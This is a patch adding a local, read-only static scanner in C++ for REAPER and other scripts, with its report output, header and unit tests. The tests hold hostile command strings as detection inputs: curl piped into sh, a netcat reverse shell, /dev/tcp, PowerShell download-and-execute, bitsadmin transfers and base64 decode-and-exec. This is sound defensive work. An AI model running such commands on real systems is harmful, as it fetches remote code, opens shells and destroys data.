++    for (auto& m : rep.baseline.missing) { Finding f; f.rule = "baseline-missing"; f.topic = "integrity"; f.category = "altered_code"; f.title = "baseline file is missing"; f.file = m; f.severity = Severity::Medium; f.evidence = "missing"; f.why = "listed in the baseline but not found"; f.confidence = 0.9; f.false_positive = 0.2; rep.findings.push_back(f); }
++  }
++  for (const char* l : {"Pattern matching only: false positives and false negatives are expected, and deliberate obfuscation defeats it.",
++                        "Nothing was executed, imported, extracted or fetched; URLs were not contacted; symbolic links were skipped, not followed.",
++                        "Compiled binaries and archives are hashed and listed but their contents are not analyzed.",
++                        "Absence of findings is not evidence that a script is safe."})
++    rep.limitations.push_back(l);
++  return R::success(std::move(rep));
++}
++
++namespace {
++std::string jstr(const std::string& s) {
++  std::string o = "\"";
++  for (unsigned char c : s) {
++    switch (c) { case '"': o += "\\\""; break; case '\\': o += "\\\\"; break; case '\n': o += "\\n"; break; case '\r': o += "\\r"; break; case '\t': o += "\\t"; break;
++      default: if (c < 32) { char b[8]; std::snprintf(b, sizeof b, "\\u%04x", c); o += b; } else o.push_back(static_cast<char>(c)); }
++  }
++  return o + "\"";
++}
++std::vector<const Finding*> sorted(const Report& r) {
++  std::vector<const Finding*> v; for (auto& f : r.findings) v.push_back(&f);
++  std::stable_sort(v.begin(), v.end(), [](const Finding* a, const Finding* b) { if (a->severity != b->severity) return a->severity > b->severity; if (a->file != b->file) return a->file < b->file; return a->line < b->line; });
++  return v;
++}
++}  // namespace
++std::string Report::to_text() const {
++  std::ostringstream o;
++  std::size_t scanned = 0; for (auto& f : files) if (f.scanned) ++scanned;
++  o << "HUSH script scan (local, read-only)\nfiles: " << files.size() << " listed, " << scanned << " scanned, " << skipped << " skipped\n";
++  o << "findings: critical=" << count(Severity::Critical) << " high=" << count(Severity::High) << " medium=" << count(Severity::Medium)
++    << " low=" << count(Severity::Low) << " info=" << count(Severity::Info) << "\n";
++  if (baseline.used) o << "baseline: modified=" << baseline.modified.size() << " new=" << baseline.new_files.size() << " missing=" << baseline.missing.size() << "\n";
++  o << "\n";
++  std::size_t shown = 0;
++  for (auto* f : sorted(*this)) {
++    if (++shown > 1000) { o << "... (" << findings.size() - 1000 << " more findings; use --json for the full list)\n"; break; }
++    o << "[" << severity_name(f->severity) << "] " << f->file; if (f->line) o << ":" << f->line;
++    o << "  " << f->title << "  (" << f->rule << ", confidence " << f->confidence << ", false-positive " << f->false_positive << ")\n";
++    if (!f->evidence.empty()) o << "      " << f->evidence << "\n";
++    o << "      why: " << f->why << "\n";
++  }
++  if (findings.empty()) o << "no findings (this is not proof that the files are safe)\n";
++  o << "\nLimitations:\n"; for (auto& l : limitations) o << "  * " << l << "\n";
++  return o.str();
++}
++std::string Report::to_json() const {
++  std::ostringstream o;
++  o << "{\n  \"tool\": \"hush script-scan\",\n  \"mode\": \"local-read-only\",\n  \"summary\": {\"files\": " << files.size() << ", \"skipped\": " << skipped
++    << ", \"critical\": " << count(Severity::Critical) << ", \"high\": " << count(Severity::High) << ", \"medium\": " << count(Severity::Medium)
++    << ", \"low\": " << count(Severity::Low) << ", \"info\": " << count(Severity::Info) << "},\n  \"files\": [";
++  for (std::size_t i = 0; i < files.size(); ++i) {
++    auto& f = files[i];
++    o << (i ? ",\n    " : "\n    ") << "{\"path\": " << jstr(f.path) << ", \"language\": " << jstr(f.language) << ", \"bytes\": " << f.bytes << ", \"sha256\": " << jstr(f.sha256)
++      << ", \"scanned\": " << (f.scanned ? "true" : "false") << ", \"note\": " << jstr(f.note) << "}";
++  }
++  o << "\n  ],\n  \"findings\": [";
++  std::size_t i = 0;
++  for (auto* f : sorted(*this)) {
++    o << (i++ ? ",\n    " : "\n    ") << "{\"id\": " << jstr(f->rule) << ", \"category\": " << jstr(f->category) << ", \"topic\": " << jstr(f->topic) << ", \"title\": " << jstr(f->title)
++      << ", \"severity\": " << jstr(severity_name(f->severity)) << ", \"confidence\": " << f->confidence << ", \"false_positive_likelihood\": " << f->false_positive
++      << ", \"location\": {\"file\": " << jstr(f->file) << ", \"line\": " << f->line << "}, \"evidence\": " << jstr(f->evidence) << ", \"why\": " << jstr(f->why) << "}";
++  }
++  auto arr = [&](const std::vector<std::string>& v) { std::string s = "["; for (std::size_t k = 0; k < v.size(); ++k) s += (k ? ", " : "") + jstr(v[k]); return s + "]"; };
++  o << "\n  ],\n  \"integrity\": {\"baseline_used\": " << (baseline.used ? "true" : "false") << ", \"modified_files\": " << arr(baseline.modified)
++    << ", \"new_files\": " << arr(baseline.new_files) << ", \"deleted_files\": " << arr(baseline.missing) << "},\n  \"limitations\": " << arr(limitations)
++    << ",\n  \"requires_human_review\": true\n}\n";
++  return o.str();
++}
++}  // namespace fk::scan
+diff -ruN '--exclude=evidence' '--exclude=SOURCE_SHA256SUMS.txt' '--exclude=prebuilt-linux-x86_64' '--exclude=*.orig' a/src/script_scan.hpp HUSH-2.2.0-reconciled/src/script_scan.hpp
+--- a/src/script_scan.hpp	1970-01-01 00:00:00.000000000 +0000
++++ b/src/script_scan.hpp	2026-10-15 00:57:12.202280880 +0000
+@@ -0,0 +1,46 @@
++#pragma once
++// fk::scan: local, read-only static scanner for scripts and project files (Python, Lua, EEL, JSFX, shell, batch,
++// PowerShell, JavaScript, C/C++, REAPER .RPP / reaper-kb.ini, config files). It never executes, imports, extracts or
++// fetches anything it reads, and makes no network calls. Findings are INDICATORS: a pattern scanner has false
++// positives and false negatives, and deliberate obfuscation defeats it.
++#include <cstddef>
++#include <cstdint>
++#include <filesystem>
++#include <string>
++#include <vector>
++#include "result.hpp"
++namespace fk::scan {
++enum class Severity { Info, Low, Medium, High, Critical };
++const char* severity_name(Severity s);
++struct Finding {
++  std::string rule, topic, category, title, file, evidence, why;
++  Severity severity = Severity::Info;
++  std::size_t line = 0;          // 1-based; 0 = whole file
++  double confidence = 0.5, false_positive = 0.5;
++};
++struct FileInfo { std::string path, language, sha256; std::uint64_t bytes = 0; bool scanned = false; std::string note; };
++struct BaselineResult { bool used = false; std::vector<std::string> modified, new_files, missing; };
++struct Options {
++  std::size_t max_file_bytes = 5u << 20;   // larger files are hashed but not scanned
++  std::size_t max_files = 5000;
++  int max_depth = 8;
++  std::vector<std::string> allow_hosts;    // URLs to these hosts (or their subdomains) are not reported
++  std::string baseline_path;               // sha256sum-format file; reports modified / new / missing files
++};
++struct Report {
++  std::vector<FileInfo> files;
++  std::vector<Finding> findings;
++  BaselineResult baseline;
++  std::vector<std::string> limitations;
++  std::size_t skipped = 0;
++  std::size_t count(Severity s) const;
++  Severity worst() const;                  // Info when there are no findings
++  std::string to_text() const;
++  std::string to_json() const;
++};
++std::string detect_language(const std::string& filename, const std::string& first_line);
++// Scan one in-memory text (used by tests and for pasted scripts).
++Report scan_text(const std::string& name, const std::string& text, const Options& opt = {});
++// Scan a file or a directory tree. Symbolic links are skipped, never followed.
++Result<Report> scan_path(const std::filesystem::path& root, const Options& opt = {});
++}  // namespace fk::scan
+diff -ruN '--exclude=evidence' '--exclude=SOURCE_SHA256SUMS.txt' '--exclude=prebuilt-linux-x86_64' '--exclude=*.orig' a/tests/script_scan_tests.cpp HUSH-2.2.0-reconciled/tests/script_scan_tests.cpp
+--- a/tests/script_scan_tests.cpp	1970-01-01 00:00:00.000000000 +0000
++++ b/tests/script_scan_tests.cpp	2026-10-15 00:57:12.202390766 +0000
+@@ -0,0 +1,132 @@
++// Tests for the local script scanner (fk::scan). Temp files only; nothing is executed, extracted or fetched.
++#include <cstdio>
++#include <filesystem>
++#include <fstream>
++#include <iostream>
++#include "script_scan.hpp"
++using namespace fk::scan;
++namespace fs = std::filesystem;
++static int g_fail = 0, g_run = 0;
++#define CHECK(c, m) do { ++g_run; if (!(c)) { ++g_fail; std::cout << "[FAIL] " << m << "  (" #c ")\n"; } else std::cout << "[ ok ] " << m << "\n"; } while (0)
++
++static bool has(const Report& r, const std::string& rule) { for (auto& f : r.findings) if (f.rule == rule) return true; return false; }
++static bool has_line(const Report& r, const std::string& rule, std::size_t line) { for (auto& f : r.findings) if (f.rule == rule && f.line == line) return true; return false; }
++static Report sc(const std::string& name, const std::string& text, const Options& o = {}) { return scan_text(name, text, o); }
++static void put(const fs::path& p, const std::string& s) { fs::create_directories(p.parent_path()); std::ofstream(p, std::ios::binary) << s; }
++
++static void languages() {
++  CHECK(detect_language("a.py", "") == "python" && detect_language("x.LUA", "") == "lua" && detect_language("a.eel", "") == "eel" && detect_language("s.sh", "") == "shell", "extension detection");
++  CHECK(detect_language("t.ps1", "") == "powershell" && detect_language("t.bat", "") == "batch" && detect_language("t.js", "") == "javascript" && detect_language("t.cpp", "") == "c/c++", "more extensions");
++  CHECK(detect_language("song.RPP", "") == "reaper-project" && detect_language("reaper-kb.ini", "") == "reaper-actions" && detect_language("x.jsfx", "") == "jsfx", "REAPER file kinds");
++  CHECK(detect_language("run", "#!/usr/bin/env python3") == "python" && detect_language("run", "#!/bin/bash") == "shell" && detect_language("fx", "desc:My Effect") == "jsfx", "shebang and JSFX header detection");
++}
++static void python_rules() {
++  auto r = sc("a.py", "import os\nos.system('ls')\neval(x)\nimport subprocess\nsubprocess.run(['x'])\n");
++  CHECK(has_line(r, "py-os-system", 2) && has_line(r, "py-eval", 3) && has(r, "py-subprocess"), "Python: os.system, eval, subprocess");
++  CHECK(!has(sc("a.py", "# os.system('rm')\nprint(1)\n"), "py-os-system"), "Python: a commented-out call is not code");
++  CHECK(!has(sc("a.py", "\"\"\"\nos.system('x')\n\"\"\"\nprint(1)\n"), "py-os-system"), "Python: text inside a triple-quoted docstring is not code");
++  CHECK(!has(sc("a.py", "import re\nre.compile('x')\njson.load(f)\n"), "py-exec") && !has(sc("a.py", "re.compile('x')\n"), "py-eval"), "Python: re.compile / json.load are not flagged as exec/eval");
++  CHECK(has(sc("a.py", "f = open('out.txt', 'w')\n"), "file-write-open") && !has(sc("a.py", "f = open('in.txt', 'r')\n"), "file-write-open"), "Python: open() with a write mode only");
++  CHECK(has(sc("a.py", "import socket\n"), "py-socket") && has(sc("a.py", "import urllib.request\n"), "py-urllib") && has(sc("a.py", "import ctypes\nctypes.CDLL('x')\n"), "py-ctypes"), "Python: network and native-call modules");
++  CHECK(has(sc("a.py", "import pickle\nx = pickle.loads(b)\n"), "py-pickle"), "Python: pickle.loads");
++  auto d = sc("a.py", "import base64\nexec(base64.b64decode(blob))\n");
++  CHECK(has(d, "decode-and-exec"), "decode-and-execute combination is flagged High");
++  bool high = false; for (auto& f : d.findings) if (f.rule == "decode-and-exec" && f.severity == Severity::High) high = true;
++  CHECK(high, "decode-and-exec severity is High");
++}
++static void lua_reaper_rules() {
++  auto r = sc("s.lua", "os.execute('ls')\nlocal h = io.popen('x')\nloadstring(code)()\n");
++  CHECK(has_line(r, "lua-os-execute", 1) && has_line(r, "lua-io-popen", 2) && has_line(r, "lua-loadstring", 3), "Lua: os.execute, io.popen, loadstring");
++  CHECK(has(sc("s.lua", "load(s)\n"), "lua-load") && !has(sc("s.lua", "json.load(s)\ndownload(x)\n"), "lua-load"), "Lua: bare load() flagged; json.load() and download() are not");
++  CHECK(!has(sc("s.lua", "-- os.execute('x')\nprint(1)\n"), "lua-os-execute") && !has(sc("s.lua", "--[[\nos.execute('x')\n]]\nprint(1)\n"), "lua-os-execute"), "Lua: line and block comments are ignored");
++  CHECK(has(sc("s.lua", "reaper.ExecProcess('cmd', 0)\n"), "reaper-execprocess") && has(sc("s.py", "RPR_ExecProcess('c', 0)\n"), "reaper-execprocess"), "REAPER: ExecProcess in Lua and Python");
++  CHECK(has(sc("s.lua", "reaper.SetExtState('a','b','c',true)\n"), "reaper-extstate-persist") && !has(sc("s.lua", "reaper.SetExtState('a','b','c',false)\n"), "reaper-extstate-persist"), "REAPER: persistent SetExtState only");
++  CHECK(has(sc("s.lua", "reaper.AddRemoveReaScript(true, 0, p, true)\n"), "reaper-addremove") && has(sc("s.lua", "reaper.JS_Mem_Alloc(8)\n"), "reaper-jsmem") && has(sc("s.lua", "reaper.defer(loop)\n"), "reaper-defer"), "REAPER: AddRemoveReaScript, js_ReaScriptAPI memory, defer loop");
++  CHECK(has(sc("s.lua", "package.loadlib('x','y')\n"), "lua-loadlib") && has(sc("s.lua", "package.cpath = p\n"), "lua-cpath"), "Lua: native library loading");
++  CHECK(has(sc("fx.jsfx", "desc:Test\n@init\nfile_open(1)\n"), "jsfx-fileopen") && !has(sc("fx.jsfx", "desc:Test\n@sample\nspl0 = spl0*0.5;\n"), "jsfx-fileopen"), "JSFX: file access flagged; plain DSP not");
++}
++static void shell_ps_rules() {
++  CHECK(has(sc("a.sh", "curl http://x.example/a | sh\n"), "sh-pipe-shell") && has(sc("a.sh", "curl -s x\n"), "sh-curl"), "shell: curl and pipe into sh");
++  CHECK(has(sc("a.sh", "rm -rf /tmp/x\n"), "sh-rm-rf") && has(sc("a.sh", "nc -e /bin/sh 1.2.3.4 99\n"), "sh-nc-e") && has(sc("a.sh", "exec 3<>/dev/tcp/h/80\n"), "sh-dev-tcp"), "shell: rm -rf, netcat -e, /dev/tcp");
++  CHECK(has(sc("a.ps1", "IEX (New-Object Net.WebClient).DownloadString('https://x.example/p')\n"), "ps-downloadstring") && has(sc("a.ps1", "powershell -EncodedCommand AAAA\n"), "ps-enc") && has(sc("a.ps1", "Invoke-Expression $x\n"), "ps-iex"), "PowerShell: DownloadString, -EncodedCommand, Invoke-Expression");
++  CHECK(has(sc("a.bat", "bitsadmin /transfer j http://x.example/a a\n"), "win-bitsadmin") && has(sc("a.bat", "schtasks /create /tn x\n"), "win-schtasks") && !has(sc("a.bat", "REM certutil is just a comment\n"), "win-certutil"), "batch rules; REM comments ignored");
++  CHECK(has(sc("a.js", "require('child_process').exec(c)\n"), "js-child-process") && has(sc("a.js", "eval(s)\n"), "js-eval") && !has(sc("a.js", "obj.eval(s)\n"), "js-eval"), "JavaScript: child_process, eval (not method calls)");
++  CHECK(has(sc("a.cpp", "system(cmd);\n"), "c-system") && has(sc("a.cpp", "void* h = dlopen(p, 1);\n"), "c-dlopen") && !has(sc("a.cpp", "// system(cmd)\nint main(){}\n"), "c-system") && !has(sc("a.cpp", "ecosystem(1);\n"), "c-system"), "C/C++: system, dlopen; comments and identifiers like ecosystem( ignored");
++}
++static void network_and_secrets() {
++  CHECK(has(sc("a.py", "u = 'https://evil.example/x'\n"), "url-host") && has(sc("a.py", "u = 'http://evil.example/x'\n"), "url-cleartext"), "URLs: https is Low, http is Medium");
++  CHECK(has(sc("a.py", "u = 'http://203.0.113.9:8080/a'\n"), "url-ip-literal") && has(sc("a.py", "u = 'http://abcdefg.onion/'\n"), "url-onion"), "URLs: IP literals and .onion addresses");
++  CHECK(!has(sc("a.py", "u = 'http://localhost:8080/'\n"), "url-cleartext") && !has(sc("a.py", "u = 'http://127.0.0.1/'\n"), "url-ip-literal"), "loopback URLs are not reported");
++  Options o; o.allow_hosts = {"github.com"};
++  CHECK(!has(sc("a.py", "u = 'https://api.github.com/x'\n", o), "url-host") && has(sc("a.py", "u = 'https://api.github.com/x'\n"), "url-host") && has(sc("a.py", "u = 'https://notgithub.com/x'\n", o), "url-host"), "--allow-host covers the host and its subdomains, not look-alikes");
++  CHECK(!has(sc("a.py", "u = 'https://{host}/x'\n"), "url-host"), "templated hosts are skipped");
++  auto k = sc("a.py", "password = \"hunter2hunter2\"\n");
++  bool redacted = false, leaked = false;
++  for (auto& f : k.findings) if (f.rule == "secret") { redacted = f.evidence == "[redacted]"; if (f.evidence.find("hunter2") != std::string::npos) leaked = true; }
++  CHECK(redacted && !leaked, "secrets are reported by kind with the value redacted");
++  CHECK(has(sc("a.py", "k = 'AKIAABCDEFGHIJKLMNOP'\n"), "secret"), "AWS-style key id flagged as a possible secret");
++  CHECK(has(sc("a.py", "x = '" + std::string(150, 'A') + "'\n"), "long-base64") && !has(sc("a.py", "x = 'short'\n"), "long-base64"), "long encoded blobs flagged");
++  std::string esc; for (int i = 0; i < 50; ++i) esc += "\\x41";
++  CHECK(has(sc("a.py", "x = '" + esc + "'\n"), "escape-heavy"), "heavy \\x escape sequences flagged");
++  CHECK(has(sc("a.sh", "echo x > /dev/null; crontab -l\n"), "any-crontab") && has(sc("a.sh", "systemctl enable foo\n"), "any-systemctl"), "persistence keywords");
++}
++static void reaper_files() {
++  std::string rpp = "<REAPER_PROJECT 0.1 \"6.0\" 1\n  <TRACK\n    <FXCHAIN\n      <VST \"VST3: ReaEQ\" reaeq.vst3 0 \"\" 123\n        " + std::string(60, 'Q') + "AAAA==\n      >\n      <JS \"loudness_meter\" \"\"\n      >\n    >\n    <ITEM\n      FILE \"/home/x/audio/take1.wav\"\n    >\n  >\n>\n";
++  auto r = sc("song.RPP", rpp);
++  CHECK(has(r, "rpp-plugin") && has(r, "rpp-external-path") && has(r, "rpp-state-blob"), ".RPP: plugin inventory, external media path, state blobs noted");
++  CHECK(!has(r, "long-base64"), ".RPP: plugin-state base64 is summarised, not flagged as an obfuscated blob");
++  auto kb = sc("reaper-kb.ini", "SCR 4 0 RS123 \"Script: do.lua\" \"Scripts/do.lua\"\nACT 0 0 \"x\" \"Custom\" 40001\n");
++  CHECK(has(kb, "kb-script") && has(kb, "kb-custom-action"), "reaper-kb.ini: registered scripts and custom actions listed");
++}
++static void paths_and_baseline() {
++  auto root = fs::temp_directory_path() / "hush_scan_test"; fs::remove_all(root);
++  put(root / "a.py", "import subprocess\nsubprocess.run(['x'])\n");
++  put(root / "sub/b.lua", "print('hi')\n");
++  put(root / "notes.txt", "see https://example.org/page\n");
++  std::string elf = std::string("\x7f" "ELF") + std::string(100, '\0');
++  put(root / "plug.vst3", elf);
++  put(root / "tool.bin", elf);
++  put(root / "pack.zip", std::string("PK\x03\x04") + std::string(40, '\0'));
++  std::string u16 = std::string("\xFF\xFE"); for (char c : std::string("os.execute('x')\n")) { u16.push_back(c); u16.push_back('\0'); }
++  put(root / "w.lua", u16);
++  std::error_code ec; fs::create_symlink(root / "a.py", root / "link.py", ec);
++  auto r = scan_path(root);
++  CHECK(r && r->files.size() >= 7, "directory scan lists every regular file (symlink skipped)");
++  bool saw_link = false; for (auto& f : r->files) if (f.path == "link.py") saw_link = true;
++  CHECK(!saw_link && r->skipped >= 1, "symbolic links are skipped, not followed");
++  CHECK(has(*r, "py-subprocess") && has(*r, "url-host") && has(*r, "native-plugin-binary") && has(*r, "native-binary") && has(*r, "archive-not-opened"), "mixed tree: scripts scanned; binaries and archives only inventoried");
++  bool binary_note = false; for (auto& f : r->files) if (f.path == "plug.vst3") binary_note = (f.language.find("ELF") != std::string::npos && !f.scanned && !f.sha256.empty());
++  CHECK(binary_note, "native binary is hashed and labelled, not analyzed");
++  CHECK(has(*r, "lua-os-execute"), "UTF-16 (BOM) scripts are still scanned");
++  CHECK(r->to_text().find("Limitations") != std::string::npos && r->to_json().find("\"requires_human_review\": true") != std::string::npos, "reports state their limitations");
++  Options small; small.max_file_bytes = 10;
++  auto s = scan_path(root, small); bool too_big = false; if (s) for (auto& f : s->files) if (f.path == "a.py") too_big = !f.scanned && !f.sha256.empty();
++  CHECK(s && too_big, "files over the size limit are hashed but not scanned");
++  Options few; few.max_files = 2; auto fw = scan_path(root, few);
++  CHECK(fw && fw->files.size() == 2 && !fw->limitations.empty(), "file-count limit is enforced and reported");
++  CHECK(!scan_path(root / "missing") && !scan_path(root / "link.py"), "missing paths and symlink roots are refused");
++  // baseline
++  std::string base;
++  for (auto& f : r->files) base += f.sha256 + "  ./" + f.path + "\n";
++  put(root.parent_path() / "hush_scan_base.txt", base);
++  Options bo; bo.baseline_path = (root.parent_path() / "hush_scan_base.txt").string();
++  auto same = scan_path(root, bo);
++  CHECK(same && same->baseline.used && same->baseline.modified.empty() && same->baseline.new_files.empty() && same->baseline.missing.empty(), "baseline: an unchanged tree matches");
++  put(root / "a.py", "print('tampered')\n"); put(root / "extra.sh", "echo hi\n"); fs::remove(root / "notes.txt");
++  auto diff = scan_path(root, bo);
++  CHECK(diff && diff->baseline.modified.size() == 1 && diff->baseline.modified[0] == "a.py" && diff->baseline.new_files.size() == 1 && diff->baseline.new_files[0] == "extra.sh" && diff->baseline.missing.size() == 1 && diff->baseline.missing[0] == "notes.txt", "baseline: modified, new and missing files are reported");
++  CHECK(has(*diff, "baseline-modified") && has(*diff, "baseline-new") && has(*diff, "baseline-missing"), "baseline differences become findings");
++  put(root.parent_path() / "hush_scan_badbase.txt", "not a hash line\n");
++  Options bad; bad.baseline_path = (root.parent_path() / "hush_scan_badbase.txt").string();
++  CHECK(!scan_path(root, bad), "a malformed baseline file is rejected");
++  auto js = diff->to_json();
++  CHECK(js.find("\"findings\"") != std::string::npos && js.find("\"modified_files\": [\"a.py\"]") != std::string::npos, "JSON report carries findings and integrity lists");
++  auto q = sc("q.py", "x = \"a\\\"b\"\nos.system(\"say \\\"hi\\\"\")\n");
++  CHECK(q.to_json().find("\\\"") != std::string::npos, "JSON escapes quotes in evidence");
++  fs::remove_all(root); fs::remove(root.parent_path() / "hush_scan_base.txt"); fs::remove(root.parent_path() / "hush_scan_badbase.txt");
++}
++int main() {
++  languages(); python_rules(); lua_reaper_rules(); shell_ps_rules(); network_and_secrets(); reaper_files(); paths_and_baseline();
++  std::cout << "\n" << (g_run - g_fail) << "/" << g_run << " checks passed\n";
++  return g_fail == 0 ? 0 : 1;
++}
